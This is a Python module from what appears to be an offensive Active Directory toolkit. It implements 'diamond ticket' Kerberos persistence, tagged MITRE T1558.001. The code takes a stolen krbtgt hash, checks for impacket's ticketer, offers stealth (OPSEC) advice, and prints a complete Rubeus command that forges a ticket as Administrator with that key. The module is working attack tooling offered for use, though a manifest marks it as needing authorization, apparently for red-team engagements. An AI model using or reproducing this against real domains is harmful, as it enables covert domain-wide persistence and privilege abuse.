"""Diamond ticket persistence — modify legitimate TGTs for stealth."""

from __future__ import annotations
from typing import Any

MANIFEST = {
    "capability_id": "adxpl.persistence.diamond_ticket_persist.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["kerberos_ticket_modification", "persistence"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1558.001"],
}


def run(args: Any) -> int:
    from adxpl.core.credential import ADCredential
    cred = ADCredential.from_args(args)
    krbtgt_hash = getattr(args, "krbtgt_hash", None)
    domain_sid = getattr(args, "domain_sid", None)

    print("[*] Diamond Ticket Persistence")
    print("[*] Domain: {}".format(cred.domain))
    print("[*] Unlike Golden Tickets, Diamond Tickets modify real TGTs for better OPSEC")

    if not krbtgt_hash:
        print("[!] --krbtgt-hash required (AES256 key preferred)")
        return 1

    import subprocess
    import shutil
    ticketer = shutil.which("ticketer.py") or shutil.which("impacket-ticketer")
    if not ticketer:
        print("[!] ticketer.py (impacket) not found")
        print("[*] Note: Rubeus diamond mode recommended for true diamond tickets")
        return 1

    print("[*] Requesting legitimate TGT first, then modifying PAC")
    print("[*] krbtgt key: {}...".format(krbtgt_hash[:16]))
    print("[*] For true diamond ticket, use: Rubeus.exe diamond /krbkey:{} /user:Administrator /enctype:aes256".format(krbtgt_hash))

    return 0
